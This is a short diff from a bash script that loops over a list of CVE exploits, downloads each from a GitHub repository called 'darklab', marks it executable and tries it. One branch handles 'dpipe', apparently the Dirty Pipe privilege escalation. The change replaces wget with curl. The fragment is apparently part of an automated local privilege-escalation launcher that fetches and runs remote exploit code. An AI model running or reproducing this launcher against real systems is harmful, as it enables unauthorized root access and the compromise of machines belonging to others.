@@ -37,7 +37,7 @@ cve=(
 for cvenya in "${cve[@]}"; do
     echo " "
     echo "[+] Trying Exploit $cvenya"
-    wget -q --no-check-certificate https://raw.githubusercontent.com/justikail/darklab/refs/heads/main/files/$cvenya >/dev/null 2>&1
+    curl -fsSL https://raw.githubusercontent.com/justikail/darklab/refs/heads/main/files/$cvenya -o $cvenya >/dev/null 2>&1
     chmod +x $cvenya
     if [[ "$cvenya" =~ "dpipe" ]];
     then
